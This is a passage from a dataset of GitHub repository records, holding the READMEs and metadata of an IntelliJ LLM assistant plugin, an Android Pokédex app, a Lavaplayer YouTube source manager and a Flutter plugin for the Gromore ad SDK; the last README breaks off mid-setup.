devoxx/DevoxxGenieIDEAPlugin,master,"## Devoxx Genie 

<img height=""128"" src=""src/main/resources/icons/pluginIcon.svg"" width=""128""/>

[![X](https://img.shields.io/twitter/follow/DevoxxGenie)](https://x.com/devoxxgenie)

Devoxx Genie is a fully Java-based LLM Code Assistant plugin for IntelliJ IDEA, designed to integrate with local LLM providers such as [Ollama](https://ollama.com/), [LMStudio](https://lmstudio.ai/), [GPT4All](https://gpt4all.io/index.html), [Llama.cpp](https://github.com/ggerganov/llama.cpp) and [Exo](https://github.com/exo-explore/exo) but also cloud based LLM's such as [OpenAI](https://openai.com), [Anthropic](https://www.anthropic.com/), [Mistral](https://mistral.ai/), [Groq](https://groq.com/), [Gemini](https://aistudio.google.com/app/apikey), [DeepInfra](https://deepinfra.com/dash/deployments), [DeepSeek](https://www.deepseek.com/) and [OpenRouter](https://www.openrouter.ai/)

We now also support LLM-driven web search with [Google](https://developers.google.com/custom-search) and [Tavily](https://tavily.com/).

With Claude 3.5 Sonnet, DevoxxGenie isn't just another developer tool... it's a glimpse into the future of software engineering. As we eagerly await Claude 3.5 Opus, one thing is clear: we're witnessing a paradigm shift in Ai Augmented Programming (AAP) 🐒

[<img width=""200"" alt=""Marketplace"" src=""https://github.com/devoxx/DevoxxGenieIDEAPlugin/assets/179457/1c24d692-37ea-445d-8015-2c25f63e2f90"">](https://plugins.jetbrains.com/plugin/24169-devoxxgenie)

### Hands-on with DevoxxGenie

[![DevoxxGenie Demo](https://devoxx.be/wp-content/uploads/2024/08/DevoxxGenieDemo.jpg)](https://www.youtube.com/live/kgtctcbA6WE?feature=shared&t=124)

### More Video Tutorials:

- [How ChatMemory works](https://www.youtube.com/watch?v=NRAe4d7n6_4)
- [Hands-on with DevoxxGenie](https://youtu.be/Rs8S4rMTR9s?feature=shared)

### Key Features:

- **👀 Chat History**: Your chats are stored locally, allowing you to easily restore them in the future.
- **🧠 Project Scanner**: Add source code (full project or by package) to prompt context when using Anthropic, OpenAI or Gemini.
- **💰 Token Cost Calculator**: Calculate the cost when using Cloud LLM providers.
- **🔍 Web Search** : Search the web for a given query using Google or Tavily.
- **🏎️ Streaming responses**: See each token as it's received from the LLM in real-time.
- **🧐 Abstract Syntax Tree (AST) context**: Automatically include parent class and class/field references in the prompt for better code analysis.
- **💬 Chat Memory Size**: Set the size of your chat memory, by default its set to a total of 10 messages (system + user & AI msgs).
- **☕️ 100% Java**: An IDEA plugin using local and cloud based LLM models. Fully developed in Java using [Langchain4J](https://github.com/langchain4j/langchain4j)
- **👀 Code Highlighting**: Supports highlighting of code blocks.
- **💬 Chat conversations**: Supports chat conversations with configurable memory size.
- **📁 Add files & code snippets to context**: You can add open files to the chat window context for producing better answers or code snippets if you want to have a super focused window

![GenieExample](https://github.com/devoxx/DevoxxGenieIDEAPlugin/assets/179457/5064cef3-e7f8-4ab8-9485-2dbd0a7788df)

We now support also streaming responses which you can enable in the Settings page 🤩 🚀

https://github.com/devoxx/DevoxxGenieIDEAPlugin/assets/179457/8081d4f2-c5c4-4283-af1d-19061b7ae7bf
 
### LLM Settings
In the IDEA settings you can modify the REST endpoints and the LLM parameters.  Make sure to press enter and apply to save your changes.

We now also support Cloud based LLMs, you can paste the API keys on the Settings page. 

<img width=""1196"" alt=""DevoxxGenieSettings"" src=""https://github.com/devoxx/DevoxxGenieIDEAPlugin/assets/179457/266780ce-e640-4815-b6fc-7b2a3f86292a"">

### Smart Model Selection and Cost Estimation
The language model dropdown is not just a list anymore, it's your compass for smart model selection.

![Models](https://github.com/devoxx/DevoxxGenieIDEAPlugin/assets/179457/1924a967-37c3-400c-bac4-fc1a678aeec5)

See available context window sizes for each cloud model
View associated costs upfront
Make data-driven decisions on which model to use for your project

### Add Project to prompt & clipboard

You can now add the full project to your prompt IF your selected cloud LLM has a big enough window context.

![AddFull](https://github.com/devoxx/DevoxxGenieIDEAPlugin/assets/179457/be014cf1-ee01-428a-bd75-55acc82627fb)

### Calc Cost

Leverage the prompt cost calculator for precise budget management. Get real-time updates on how much of the context window you're using.

![AddCalcProject](https://github.com/devoxx/DevoxxGenieIDEAPlugin/assets/179457/0c971331-40fe-47a4-8ede-f349fa40c00c)

See the input/output costs and window context per Cloud LLM.  Eventually we'll also allow you to edit these values.

![Cost](https://github.com/devoxx/DevoxxGenieIDEAPlugin/assets/179457/422fc829-fc9f-42f4-a8e5-c33ec5a239fc)

### Handling Massive Projects?
""But wait,"" you might say, ""my project is HUGE!"" 😅 

Fear not! We've got options:

1. Leverage Gemini's Massive Context: 

Gemini's colossal 1 million token window isn't just big, it's massive. We're talking about the capacity to digest approximately 30,000 lines of code in a single go. That's enough to digest most codebases whole, from the tiniest scripts to some decent projects.

But if that's not enough you have more options...

2. Smart Filtering: 

The new ""Copy Project"" panel lets you: 

Exclude specific directories 
Filter by file extensions
Remove JavaDocs to slim down your context

![Filter](https://github.com/devoxx/DevoxxGenieIDEAPlugin/assets/179457/9dd782db-5f2a-4397-90d9-21cfefac753c)

3. Selective Inclusion 

Right-click to add only the most relevant parts of your project to the context.

![RightClick](https://github.com/devoxx/DevoxxGenieIDEAPlugin/assets/179457/a86c311a-4589-41f9-bb4a-c8c4f0b884ee)


## The Power of Full Context: A Real-World Example
The DevoxxGenie project itself, at about 70K tokens, fits comfortably within most high-end LLM context windows. 
This allows for incredibly nuanced interactions – we're talking advanced queries and feature requests that leave tools like GitHub Copilot scratching their virtual heads!

## Local LLM Cluster with Exo

V0.2.7 also supports Exo, a local LLM cluster for Apple Silicon which allows you to run Llama 3.1 8b, 70b and 405b on your own Apple computers 🤩

![image](https://github.com/user-attachments/assets/a79033ff-d9dd-442d-aa92-0fc70cc37747)


### Installation:

- **From IntelliJ IDEA**: Go to `Settings` -> `Plugins` -> `Marketplace` -> Enter 'Devoxx' to find [plugin](https://plugins.jetbrains.com/plugin/24169-devoxxgenie) OR Install plugin from Disk
- **From Source Code**: Clone the repository, build the plugin using `./gradlew buildPlugin`, and install the plugin from the `build/distributions` directory and select file 'DevoxxGenie-X.Y.Z.zip'

### Requirements:

- **IntelliJ** minimum version is 2023.3.4
- **Java** minimum version is JDK 17

### Build

Gradle IntelliJ Plugin prepares a ZIP archive when running the buildPlugin task.  
You'll find it in the build/distributions/ directory

```shell
./gradlew buildPlugin 
```

### Publish plugin

It is recommended to use the publishPlugin task for releasing the plugin

```shell
./gradlew publishPlugin
```


### Usage:
1) Select an LLM provider from the DevoxxGenie panel (right corner)
2) Select some code 
4) Enter shortcode command review, explain, generate unit tests of the selected code or enter a custom prompt.

Enjoy! 
","DevoxxGenie is a plugin for IntelliJ IDEA that uses local LLM's (Ollama, LMStudio, GPT4All, Llama.cpp and Exo) and Cloud based LLMs to help review, test, explain your project code.","anthropic,assistant,copilot,gemini,genai,gpt4all,groq,intellij-plugin,java,llm",2024-04-14T21:08:14Z,2024-09-23T16:17:06Z,2024-09-23T15:29:09Z,51,7,142,490,24,24,151,39,0,MIT,Java
grishka/poke.dex,master,"# Poke.dex

So one day, I saw someone post their [Jetpack Compose pokedex app](https://github.com/skydoves/pokedex-compose) on /r/androiddev on Reddit as supposedly following the current ""best practices"" around Android app development. I took it as a challenge to build the same thing, but **ignoring** all the things that Google recommends on this particular season and/or that I might be required to like if I cared about the labor market.

<img src=""/images/screenshots.jpg""/>

## Download

Go to [releases](https://github.com/grishka/poke.dex/releases/latest) to download the latest apk.

## Tech stack & open-source libraries
- Minimum SDK level is 21 (Android 5.0).
- Java 17 based, utilizing [Runnable](https://developer.android.com/reference/java/lang/Runnable)s posted to [HandlerThread](https://developer.android.com/reference/android/os/HandlerThread)s and back to the main thread for asynchronous operations.
- Jetpack libraries:
  - None really.
  - There are RecyclerView and SwipeRefreshLayout from [LiteX](https://github.com/grishka/LiteX), my de-appcompat-ified fork of several AndroidX libraries.
  - AndroidX and Jetpack aren't the same thing, are they? Or is AndroidX part of Jetpack?
- Architecture:
  - Something MVC-ish I guess? I don't really like following patterns for the sake of following patterns.
  - I do sometimes end up with a pattern in my code by pure coincidence because that ends up being the most optimal way of solving the task at hand.
- [OkHttp3](https://github.com/square/okhttp/tree/okhttp_3.14.x) for networking.
- [Appkit](https://github.com/grishka/appkit) for some boilerplate and an image loader.
- [Gson](https://github.com/google/gson) for JSON parsing.
- [Parceler](https://github.com/johncarl81/parceler) for one (1) class that I needed to be parcelable.
  - Yes it's overkill in this particular case. But then I used Parceler in another project and I liked it (I used an Android Studio plugin to generate parcelables before that). And I want to show off my Android stack to contrast it with the ""best practice"" one anyway.
- Android's built-in SQLite for caching.
  - No fancy abstraction libraries on top of it. It's `Cursor`s all the way down!

## Open API
Poke.dex uses the [PokeAPI](https://pokeapi.co/) to retrieve the Pokémon data.

## FAQ

#### Is this project serious?
Absolutely. This is more-or-less how I've been doing Android apps for around 10 years, including ones used by millions of people.

#### Have you tried { technology.name }?
Probably not. I'm not very open to innovation in programming because most of the current ""innovations"" involve piling ever more abstraction layers on top of each other for no other benefit than to say ""my code looks beautiful"" or ""this project can be worked on even by most junior of developers who need not understand the abstraction layers beneath the topmost one"".

I do like where Java is going though, hence Java 17.
",,,2024-04-15T16:32:57Z,2024-04-17T12:44:33Z,2024-04-16T23:52:48Z,1,1,1,3,0,10,139,1,0,Unlicense,Java
lavalink-devs/youtube-source,main,"# youtube-source
A rewritten YouTube source manager for Lavaplayer.

This source aims to provide robustness by leveraging multiple InnerTube clients
for requests. Where one client fails, another will try to load the request.
Which clients are used is entirely configurable.

## Table of Contents
- [Common](#common)
  - Information about the `common` module and usage of.
- [V2](#v2)
  - Information about the `v2` module and usage of.
- [Plugin](#plugin)
  - Information about the `plugin` module and usage of.
- [Available Clients](#available-clients)
  - Information about the clients provided by `youtube-source`, as well as their advantages/disadvantages.
- [Using OAuth tokens](#using-oauth-tokens)
  - Information on using OAuth tokens with `youtube-source`.
- [Using a poToken](#using-a-potoken)
  - Information on using a `poToken` with `youtube-source`.
- [REST Routes (`plugin` only)](#rest-routes-plugin-only)
  - Information on the REST routes provided by the `youtube-source` plugin module.
- [Migration Information](#migration-from-lavaplayers-built-in-youtube-source)
  - Information on migrating from Lavaplayer's built-in Youtube source manager.
- [Additional Support](#additional-support)
  - For everything else.

## common
This module provides the base source manager, which can be used with any
`com.sedmelluq.discord.lavaplayer` packages still on major version `1`.

<details>
<summary>Using in Gradle:</summary>

```kotlin
repositories {
  // replace with https://maven.lavalink.dev/snapshots if you want to use a snapshot version.
  maven(url = ""https://maven.lavalink.dev/releases"")
}

dependencies {
  // Replace VERSION with the current version as shown by the Releases tab or a long commit hash `-SNAPSHOT` for snapshots.
  implementation(""dev.lavalink.youtube:common:VERSION"")
}
```

</details>
Example usage:

```java
YoutubeAudioSourceManager youtube = new YoutubeAudioSourceManager();
// Optionally, you may instantiate the source with a custom options, such as toggling use of searching, and clients.
YoutubeAudioSourceManager youtube = new YoutubeAudioSourceManager(/*allowSearch:*/ true, new Client[] { new Music(), new Web(), new AndroidTestsuite() });
```

You may also extend the `Client` interface to support additional InnerTube clients. There are a few abstract classes to
make this easier, notably, `MusicClient` (for `music.youtube.com` InnerTube clients), `NonMusicClient` (for youtube.com
innertube clients) and `StreamingNonMusicClient` (for clients that can be used to stream videos).

Support for IP rotation has been included, and can be achieved using the following:
```java
AbstractRoutePlanner routePlanner = new ...
YoutubeIpRotatorSetup rotator = new YoutubeIpRotatorSetup(routePlanner);

// 'youtube' is the variable holding your YoutubeAudioSourceManager instance.
rotator.forConfiguration(youtube.getHttpInterfaceManager(), false)
    .withMainDelegateFilter(youtube.getContextFilter()) // IMPORTANT
    .setup();
```

## v2
This modules expands on `common` by providing additional support for
Lavaplayer `2.x` clients, such as [Lavalink-Devs/Lavaplayer](https://github.com/lavalink-devs/lavaplayer).
Such features currently include thumbnail support within `AudioTrackInfo`.
Additional clients are included that provide access to this additional information.
These clients are suffixed with `Thumbnail`, such as `WebWithThumbnail`, `AndroidWithThumbnail` etc.

<details>
<summary>Using in Gradle:</summary>

```kotlin
repositories {
  // replace with https://maven.lavalink.dev/snapshots if you want to use a snapshot version.
  maven(url = ""https://maven.lavalink.dev/releases"")
}

dependencies {
  // Replace VERSION with the current version as shown by the Releases tab or a long commit hash `-SNAPSHOT` for snapshots.
  implementation(""dev.lavalink.youtube:v2:VERSION"")
}
```

</details>

Example usage:
```java
// same as the 'common' module but there are additional clients that provide video thumbnails in the returned metadata.
YoutubeAudioSourceManager youtube = new YoutubeAudioSourceManager(/*allowSearch:*/ true, new Client[] { new MusicWithThumbnail(), new WebWithThumbnail(), new AndroidTestsuiteWithThumbnail() });
```

## plugin
This module serves as the plugin for use with [Lavalink](https://github.com/lavalink-devs/Lavalink).

To use this plugin with Lavalink, you must declare the dependency.

<details>
<summary>Using with Lavalink v3:</summary>

```yaml
lavalink:
  plugins:
    # Replace VERSION with the current version as shown by the Releases tab or a long commit hash for snapshots.
    - dependency: ""dev.lavalink.youtube:youtube-plugin:VERSION""
      repository: ""https://maven.lavalink.dev/releases"" # use https://maven.lavalink.dev/snapshots if you want to use a snapshot version.
```

</details>

<details>
<summary>Using with Lavalink v4:</summary>

```yaml
lavalink:
  plugins:
    # Replace VERSION with the current version as shown by the Releases tab or a long commit hash for snapshots.
    - dependency: ""dev.lavalink.youtube:youtube-plugin:VERSION""
      snapshot: false # Set to true if you want to use a snapshot version.
```

</details>

Configuring the plugin:
> [!IMPORTANT]
> You must make sure to disable the built-in YouTube source like so:
```yaml
lavalink:
  server:
    sources:
      youtube: false
```

> [!NOTE]
> Existing options, such as `ratelimit` and `youtubePlaylistLoadLimit` will be picked up automatically by the plugin,
> so these don't need changing.
> 
```yaml
plugins:
  youtube:
    enabled: true # Whether this source can be used.
    allowSearch: true # Whether ""ytsearch:"" and ""ytmsearch:"" can be used.
    allowDirectVideoIds: true # Whether just video IDs can match. If false, only complete URLs will be loaded.
    allowDirectPlaylistIds: true # Whether just playlist IDs can match. If false, only complete URLs will be loaded.
    # The clients to use for track loading. See below for a list of valid clients.
    # Clients are queried in the order they are given (so the first client is queried first and so on...)
    clients:
      - MUSIC
      - ANDROID_TESTSUITE
      - WEB
      - TVHTML5EMBEDDED
```

### Advanced Options
```yaml
    # The below section of the config allows setting specific options for each client, such as the requests they will handle.
    # If an option, or client, is unspecified, then the default option value/client values will be used instead.
    # If a client is configured, but is not registered above, the options for that client will be ignored.
    # WARNING!: THE BELOW CONFIG IS FOR ILLUSTRATION PURPOSES. DO NOT COPY OR USE THIS WITHOUT
    # WARNING!: UNDERSTANDING WHAT IT DOES. MISCONFIGURATION WILL HINDER YOUTUBE-SOURCE'S ABILITY TO WORK PROPERLY.

    # Write the names of clients as they are specified under the heading ""Available Clients"".
    clientOptions:
      WEB:
        # Example: Disabling a client's playback capabilities.
        playback: false
        videoLoading: false # Disables loading of videos for this client. A client may still be used for playback even if this is set to 'false'.
      TVHTML5EMBEDDED:
        # Example: Configuring a client to exclusively be used for video loading and playback.
        playlistLoading: false # Disables loading of playlists and mixes.
        searching: false # Disables the ability to search for videos.
```

## Available Clients
Currently, the following clients are available for use:

- `MUSIC`
  - ✔ Provides support for searching YouTube music (`ytmsearch:`).
  - ❌ Cannot be used for playback, or playlist/mix/livestream loading.
- `WEB`
  - ✔ Opus formats.
- `WEBEMBEDDED`
  - ✔ Opus formats.
  - ❌ No mix/playlist/search support.
- `ANDROID`
  - ❌ Heavily restricted, frequently dysfunctional.
- `ANDROID_TESTSUITE`
  - ✔ Opus formats.
  - ❌ No mix/playlist/livestream support.
- `ANDROID_LITE`
  - ❌ No Opus formats (requires transcoding).
  - ❌ No mix/playlist/livestream support.
- `ANDROID_MUSIC`
  - ✔ Opus formats.
  - ❌ No playlist/livestream support.
- `MEDIA_CONNECT`
  - ❌ No Opus formats (requires transcoding).
  - ❌ No mix/playlist/search support.
- `IOS`
  - ❌ No Opus formats (requires transcoding).
- `TVHTML5EMBEDDED`
  - ✔ Opus formats.
  - ✔ Age-restricted video playback.
  - ❌ No playlist support.

## Using OAuth Tokens
You may notice that some requests are flagged by YouTube, causing an error message asking you to sign in to confirm you're not a bot.
With OAuth integration, you can request that `youtube-source` use your account credentials to appear as a normal user, with varying degrees
of efficacy. **You do _not_ need to use `poToken` with OAuth.**

> [!WARNING]
> Similar to the `poToken` method, this is NOT a silver bullet solution, and worst case could get your account terminated!
> For this reason, it is advised that **you use burner accounts and NOT your primary!**.
> This method may also trigger ratelimit errors if used in a high traffic environment.
> USE WITH CAUTION!

> [!NOTE]
> You may need to set your log level for `dev.lavalink.youtube.http.YoutubeOauth2Handler` to `INFO`, to see additional information
> within your terminal regarding completing the OAuth flow.

> [!NOTE]
> If you do not have a refresh token, then do not supply one. The source will output your refresh token into your terminal upon
> successfully completing the OAuth flow at least **once**. If you do not see your token, you may need to configure your
> logging (see above note).

You can instruct `youtube-source` to use OAuth with the following:

### Lavaplayer
```java
YoutubeAudioSourceManager source = new YoutubeAudioSourceManager();
// This will trigger an OAuth flow, where you will be instructed to head to YouTube's OAuth page and input a code.
// This is safe, as it only uses YouTube's official OAuth flow. No tokens are seen or stored by us.
source.useOauth2(null, false);

// If you already have a refresh token, you can instruct the source to use it, skipping the OAuth flow entirely.
// You can also set the `skipInitialization` parameter, which skips the OAuth flow. This should only be used
// if you intend to supply a refresh token later on. You **must** either complete the OAuth flow or supply
// a refresh token for OAuth integration to work.
source.useOauth2(""your refresh token"", true);
```

### Lavalink
```yaml
plugins:
  youtube:
    enabled: true
    oauth:
      # setting ""enabled: true"" is the bare minimum to get OAuth working.
      enabled: true

      # if you have a refresh token, you may set it below (make sure to uncomment the line to apply it).
      # setting a valid refresh token will skip the OAuth flow entirely. See above note on how to retrieve
      # your refreshToken.
      # refreshToken: ""paste your refresh token here if applicable""

      # Set this if you don't want the OAuth flow to be triggered, if you intend to supply a refresh token later.
      # Initialization is skipped automatically if a valid refresh token is supplied. Leave this commented if you're
      # completing the OAuth flow for the first time/do not have a refresh token.
      # skipInitialization: true
```

## Using a `poToken`
A `poToken`, also known as a ""Proof of Origin Token"" is a way to identify what requests originate from.
In YouTube's case, this is sent as a JavaScript challenge that browsers must evaluate, and send back the resolved
string. Typically, this challenge would remain unsolved for bots as more often than not, they don't simulate an entire
browser environment, instead only evaluating the minimum amount of JS required to do its job. Therefore, it's a reasonable
assumption that if the challenge is not fulfilled, the request origin is a bot.

To obtain a `poToken`, you can use https://github.com/iv-org/youtube-trusted-session-generator, by running the Python script
or the docker image. Both methods will print a `poToken` after a successful run, which you can supply to `youtube-source`
to try and work around having automated requests blocked.


> [!NOTE]
> A `poToken` is not a silver bullet, and currently it only applies to requests made via the `WEB` client.
> You do not need to specify a `poToken` if using OAuth, and vice versa.

Specifying the token is as simple as doing:

### Lavaplayer
```java
// Web is dev.lavalink.youtube.clients.Web
Web.setPoTokenAndVisitorData(""your po_token"", ""your visitor_data"");
```

### Lavalink
```yaml
plugins:
  youtube:
    pot:
      token: ""paste your po_token here""
      visitorData: ""paste your visitor_data here""
```

## REST routes (`plugin` only)
### `POST` `/youtube`

Body:

> [!NOTE]
> You do not need to provide everything as it is shown.
> For example, you can specify just `refreshToken` and `skipInitialization`, or just `poToken` and `visitorData`.
> You do **not** need to use `poToken` with OAuth and vice versa.

```json
{
  ""refreshToken"": ""your new refresh token"",
  ""skipInitialization"": true,
  ""poToken"": ""your po_token"",
  ""visitorData"": ""your visitor_data""
}
```

Response:

If the YouTube source is not enabled, or the `refreshToken` is invalid:
`500 - Internal Server Error`

Otherwise:
`204 - No Content`

### `GET` `/youtube`

Response:

If the YouTube source is not enabled:
`500 - Internal Server Error`

Otherwise:
```json
{
  ""refreshToken"": ""your current refresh token, or null""
}
```

### `GET` `/youtube/stream/{videoId}`

Query parameters:

| Key          | Value Type | Required | Notes                                                                                                                                                                       |
|--------------|------------|----------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| itag         | integer    | No       | The [itag](https://gist.github.com/AgentOak/34d47c65b1d28829bb17c24c04a0096f) of the desired format. If unspecified, youtube-source's default format selector will be used. |
| withClient   | string     | No       | The identifier of the client to use for streaming. Uses all clients if unspecified.                                                                                         |

Response:

If `videoId` could not be found or loaded, or the `itag` does not exist, or if no client supports format loading:
`400 - Bad Request`

Otherwise:
`200 - OK` accompanied by the selected format stream (audio or video). `Content-Type` header will be set appropriately.

## Migration from Lavaplayer's built-in YouTube source

This client is intended as a direct replacement for Lavaplayer's built-in `YoutubeAudioSourceManager`,
which has been deprecated in a recent release of [Lavalink-Devs/Lavaplayer](https://github.com/lavalink-devs/lavaplayer).

When using `AudioSourceManagers.registerRemoteSources(AudioPlayerManager)`, Lavaplayer will register its own
deprecated `YoutubeAudioSourceManager`, which must be disabled.
Some versions of Lavaplayer may include an optional `excludeSources` parameter, allowing you to toggle the adding of the source.
If the version you are using does not support this, you will need to manually register each `AudioSourceManager` yourself.

First, create and register an instance of the supported `YoutubeAudioSourceManager` from the `youtube-source` package.
```java
AudioPlayerManager playerManager = new DefaultAudioPlayerManager();
YoutubeAudioSourceManager ytSourceManager = new dev.lavalink.youtube.YoutubeAudioSourceManager();
playerManager.registerSourceManager(ytSourceManager);
```

If your version of Lavaplayer supports an `excludeSources` parameter or equivalent, you may exclude the built-in
`YoutubeAudioSourceManager` using the following:
```java
AudioSourceManagers.registerRemoteSources(playerManager,
                                          com.sedmelluq.discord.lavaplayer.source.youtube.YoutubeAudioSourceManager.class);
```

Otherwise, you will need to register each source manager individually.

In addition, there are a few significant changes to note:

- This source's class structure differs so if you had custom classes that you were initialising
  the source manager with (e.g. an overridden `YoutubeTrackDetailsLoader`), this **is not** compatible
  with this source manager.

- Support for logging into accounts as a means of playing age-restricted tracks has been removed, with the
  `TVHTML5EMBEDDED` client instead being the preferred workaround. There were a large number of
  reasons for this change, but not least the fact that logging in was slowly becoming problematic and deprecated
  on the YouTube backend. The amount of code to support this feature meant that it has been axed.

## Additional Support
If you need additional help with using this source, that's not covered here or in any of the issues, 
[join our Discord server](https://discord.gg/ZW4s47Ppw4).
",A rewritten YouTube source manager for Lavaplayer.,,2024-04-16T17:00:38Z,2024-09-25T20:38:18Z,2024-09-23T19:09:05Z,22,10,16,109,4,19,132,1,1,MIT,Java
flutter-youni/flutter_youni_gromore,master,"# 🔥🔥🔥穿山甲Gromore的Flutter插件（由你团队出品）

<p>
<a href=""https://pub.flutter-io.cn/packages/flutter_youni_gromore""><img src=https://img.shields.io/pub/v/flutter_youni_gromore?color=orange></a>
<a href=""https://pub.flutter-io.cn/packages/flutter_youni_gromore""><img src=https://img.shields.io/pub/likes/flutter_youni_gromore></a>
<a href=""https://pub.flutter-io.cn/packages/flutter_youni_gromore""><img src=https://img.shields.io/pub/points/flutter_youni_gromore></a>
<a href=""https://github.com/flutter-youni/flutter_youni_gromore/commits""><img src=https://img.shields.io/github/last-commit/flutter-youni/flutter_youni_gromore></a>
<a href=""https://github.com/flutter-youni/flutter_youni_gromore""><img src=https://img.shields.io/github/stars/flutter-youni/flutter_youni_gromore></a>
</p>


## 简介

**Gromore最新版本**的Flutter插件，我们是一个致力于服务独立开发者的团队，这个插件我们会一直维护。

创业过程中我们解决了各种大大小小的问题，我希望我们的创业经验能让你少走弯路，遇到任何和创业相关的问题都可以咨询我们，万一我们遇到过呢。

* 如果你想做一个小项目需要资金联系我们
* 如果你有个想法，需要开发者和运营联系我们
* 如果你已经有开发好了一个应用，需要一个公司上架联系我们
* 如果你想找个公司接广告，我们只收10%，这个价格全网也难找

## 为什么选择新版本的Gromore？

1、老版本会面临被下架的风险，老版本的穿上甲版本有过度获取隐私位置隐私的问题。

<img src=""https://github.com/flutter-youni/flutter_youni_gromore/blob/master/readme_image/162448.png"" alt=""WX20240415-162448@2x"" style=""zoom:50%;"" />

2、会提高收入，如果是大的活动，比如双11，gromore都会针对这个版本进行更新，新版本的cpm都会有10%的提升

<img src=""https://github.com/flutter-youni/flutter_youni_gromore/blob/master/readme_image/64346708.png"" alt=""image-20240415164346708"" style=""zoom: 33%;"" />

## 支持平台

- ✅ **Android**
- ✅ **iOS**

## 支持广告

- ✅ **开屏广告**
- ✅ **插屏广告**
- ✅ **激励广告**
- ✅ **Banner广告**
- ❎**信息流广告**

## 接入方法

下面将分成Android和iOS一些配置，**Android和iOS接入Flutter的步骤都是相同的**；

### Android接入方法

Android的接入分成2个步骤

1、配置AndroidManifest，包括添加权限和provider；

2、Gradle需要的配置；

#### 步骤1：配置AndroidManifest

1、需要再AndroidManifest文件中添加以下权限；

```xml
<uses-permission android:name=""android.permission.INTERNET"" /> 
<uses-permission android:name=""android.permission.ACCESS_NETWORK_STATE"" /> 
<uses-permission android:name=""android.permission.WRITE_EXTERNAL_STORAGE"" />   
<uses-permission android:name=""android.permission.READ_EXTERNAL_STORAGE"" />
<uses-permission android:name=""android.permission.REQUEST_INSTALL_PACKAGES"" /> 
<uses-permission android:name=""android.permission.READ_PHONE_STATE"" />  
```

2、资源文件配置，下面只包括了穿山甲和优量汇的配置，如果单独需要穿山甲或者优量汇，可以分别单独添加配置，如果需要配置快手、百度等平台请参考[如何接入快手、百度等平台的广告](https://www.csjplatform.com/union/media/union/download/detail?id=142&docId=27562&osType=android)

* 穿山甲和优量汇的provider配置，具体可以参考flutter_youni_gromore的Android demo

```xml
<!-- 穿山甲 start================== -->
        <provider
            android:name=""com.bytedance.sdk.openadsdk.TTFileProvider""
            android:authorities=""${applicationId}.TTFileProvider""
            android:exported=""false""
            android:grantUriPermissions=""true"">
            <meta-data
                android:name=""android.support.FILE_PROVIDER_PATHS""
                android:resource=""@xml/pangle_file_paths"" />
        </provider>

        <provider
            android:name=""com.bytedance.sdk.openadsdk.multipro.TTMultiProvider""
            android:authorities=""${applicationId}.TTMultiProvider""
            android:exported=""false"" />
        <!-- 穿山甲 end================== -->

<!-- GDT start================== -->
<!-- targetSDKVersion >= 24时才需要添加这个provider。provider的authorities属性的值为${applicationId}.fileprovider，请开发者根据自己的${applicationId}来设置这个值，例如本例中applicationId为""com.qq.e.union.demo""。 -->
        <provider
            android:name=""com.qq.e.comm.GDTFileProvider""
            android:authorities=""${applicationId}.gdt.fileprovider""
            android:exported=""false""
            android:grantUriPermissions=""true"">
            <meta-data
                android:name=""android.support.FILE_PROVIDER_PATHS""
                android:resource=""@xml/gdt_file_path"" />
        </provider>    
<activity
        android:name=""com.qq.e.ads.PortraitADActivity""
        android:configChanges=""keyboard|keyboardHidden|orientation|screenSize""
        android:screenOrientation=""portrait"" />
    <activity
        android:name=""com.qq.e.ads.LandscapeADActivity""
        android:configChanges=""keyboard|keyboardHidden|orientation|screenSize""
        android:screenOrientation=""landscape""
        tools:replace=""android:screenOrientation"" />

    <!-- 声明SDK所需要的组件 -->
    <service
        android:name=""com.qq.e.comm.DownloadService""
        android:exported=""false"" />
    <!-- 请开发者注意字母的大小写，ADActivity，而不是AdActivity -->

    <activity
        android:name=""com.qq.e.ads.ADActivity""
        android:configChanges=""keyboard|keyboardHidden|orientation|screenSize"" />
    <!-- GDT end================== -->
```

* 这个步骤是配置`android.support.FILE_PROVIDER_PATHS`需要额xml文件，res/xml目录下添加两个个文件，文件名称是`pangle_file_paths.xml`和`gdt_file_path.xml`

  下面是`pangle_file_paths.xml`文件内容

  ```xml
   <?xml version=""1.0"" encoding=""utf-8""?>
   <paths>
       <external-path name=""tt_external_root"" path=""."" />
       <external-path name=""tt_external_download"" path=""Download"" />
       <external-files-path name=""tt_external_files_download"" path=""Download"" />
       <files-path name=""tt_internal_file_download"" path=""Download"" />
       <cache-path name=""tt_internal_cache_download"" path=""Download"" />
   </paths>
  ```
  
  下面是`gdt_file_path.xml`文件内容
  
  ```xml
  <paths>
      <!-- 这个下载路径也不可以修改，必须为com_qq_e_download -->
      <external-cache-path
          name=""gdt_sdk_download_path1""
          path=""com_qq_e_download"" />
      <cache-path
          name=""gdt_sdk_download_path2""
          path=""com_qq_e_download"" />
  </paths>
  ```
  
  #### 步骤2：配置Gradle
  
  1、在rallprojects和buildscript下面添穿上甲的maven
  
  ```groovy
  buildscript {
      repositories {
          maven {
              url ""https://artifact.bytedance.com/repository/pangle""
          }
      }
  }
  
  rootProject.allprojects {
      repositories {
          maven {
              url ""https://artifact.bytedance.com/repository/pangle""
          }
      }
  }
  ```
  
  2、添加依赖库
  
  ```groovy
  dependencies {
      implementation ""com.pangle.cn:mediation-sdk:5.9.2.8""//融合基础包，必须引入
    
      implementation ""com.qq.e.union:union:4.540.1410""// 添加优量汇的广告SDK
    	implementation ""com.pangle.cn:mediation-gdt-adapter:4.540.1410.3""//添加优量汇的adapter
  } 
  ```
  
  ### iOS接入方法
  
  Android的接入分成2个步骤
  
  1、添加pod依赖；
  
  2、在`Info.plist`文件中添加权限；
  
  #### 步骤1：添加pod依赖
  
  在`Podfile`文件中添加穿山甲和优量汇的pod依赖，可以参考flutter_youni_gromore下的iOSdemo
  
  ```pascal
  target 'Runner' do
    pod 'CSJMGdtAdapter', '4.14.63.0'
    pod 'GDTMobSDK','4.14.63'
  end
  ```
  
  #### 步骤2：添加权限
  
  在iOS14.5以后想要依旧能使用IDFA，建议开发者在初始化聚合SDK之前获取ATT授权，以便允许用户授权跟踪权限。
  
  首先，需要在App层级的info.plist里添加ATT权限描述：
  
  ```xml
  <key>NSUserTrackingUsageDescription</key>
  	<string>ATT权限使用说明，需要开发者自行设置描述</string>
  ```
  
  ### Flutter集成步骤
  
  #### pubspec.yaml
  ```Dart
  flutter_youni_gromore: ^1.0.0
  ```
  #### 引入
  ```Dart
  import 'package:flutter_youni_gromore/flutter_youni_gromore.dart';
  ```
  
  ## 使用
  
  ### SDK初始化
  ```Dart
  WidgetsFlutterBinding.ensureInitialized();
  setGromoreEvent();//设置广告监听事情，这个事件包括一些错误事件、激励视频事件
